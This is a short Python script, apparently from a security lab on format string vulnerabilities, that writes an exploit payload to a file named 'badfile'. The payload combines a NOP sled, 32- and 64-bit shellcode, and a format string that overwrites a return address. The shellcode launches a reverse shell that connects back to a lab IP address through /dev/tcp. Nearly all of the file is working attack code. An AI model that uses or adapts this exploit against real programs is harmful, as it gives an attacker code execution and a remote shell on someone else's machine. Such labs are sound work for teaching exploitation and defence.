#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1          *"
   "\xa8\xd7\xff\xff"   # Placeholder for argv[0] --> "/bin/bash"
   "\xac\xd7\xff\xff"   # Placeholder for argv[1] --> "-c"
   "\xb0\xd7\xff\xff"   # Placeholder for argv[2] --> the command string
   "\xc4\xd7\xff\xff"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.7/9090 0<&1 2>&1           *"
   "ffffd7a8"   # Placeholder for argv[0] --> "/bin/bash"
   "ffffd7ac"   # Placeholder for argv[1] --> "-c"
   "ffffd7b0"   # Placeholder for argv[2] --> the command string
   "ffffd7c4"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

N = 1500
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Choose the shellcode version based on your target
shellcode = shellcode_32

# Put the shellcode somewhere in the payload
start = 1500 - len(shellcode)            # Change this number
content[start:start + len(shellcode)] = shellcode

############################################################
#
#    Construct the format string here
# 
############################################################

#0xffffd1ee
#0xffffd1ec
#print(len(shellcode))

number  = 0xffffd1ee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

number2  = 0xffffd1ec
content[4:8]  =  (number2).to_bytes(4,byteorder='little')

# value for return address ffffd6d6

s = '%.65527x' + '%60$hn' + '%.54999x' + '%61$hn'

fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Save the format string to file
with open('badfile', 'wb') as f:
  f.write(content)
